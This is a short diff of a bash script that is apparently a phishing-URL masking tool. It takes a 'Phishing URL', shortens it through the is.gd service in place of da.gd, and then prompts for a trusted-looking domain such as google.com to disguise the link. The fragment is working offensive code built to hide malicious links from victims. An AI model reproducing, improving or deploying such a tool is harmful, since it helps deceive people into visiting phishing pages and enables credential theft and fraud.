@@ -21,7 +21,10 @@ echo -e "\e[1;31;42m ### Phishing URL ###\e[0m \n"
 echo -n "Paste Phishing URL here (with http or https): "
 read phish
 url_checker $phish
-short=$(curl -s https://da.gd/s/?url=${phish})
+sleep 1
+echo "Processing and Modifing Phishing URL"
+sleep 1
+short=$(curl https://is.gd/create.php\?format\=simple\&url\=${phish})
 shorter=${short#https://}
 echo -e "\n\e[1;31;42m ### Masking Domain ###\e[0m"
 echo 'Domain to mask the Phishing URL (with http or https), ex https://google.com, http
